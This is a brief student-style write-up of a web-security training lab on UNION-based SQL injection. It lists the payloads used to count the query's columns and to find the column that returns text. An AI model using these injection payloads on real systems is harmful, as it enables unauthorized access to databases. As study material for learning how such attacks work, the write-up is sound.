# lab 4 : SQL injection UNION attack, finding a column containing text

# SQL injection vulnerability in the product category filter
SELECT * FROM products WHERE category = 'Gifts'

# End goal : finding a column containing text

 s0  as we did in the lab 3rd the first goal is to find the no uf columns in union based attack.
 so use null ,null,null and + to hide space in burp.

1. '+UNION+SELECT+NULL,NULL,NULL-- (on this query response is 200ok so there are three no of columns)

2. no we have to find in which column the string is allowed :

'+UNION+SELECT+'a',NULL,NULL--
'+UNION+SELECT+NULL,'a',NULL--
'+UNION+SELECT+NULL,NULL,'a'--
 on 2nd query we'll got the 200ok so  this is final string .

 and insted of 'a' we have to put the given keyword which is 'GpjmZj' 

 and we'll finaly able to (finding a column containing text)

 hence lab solved!!!


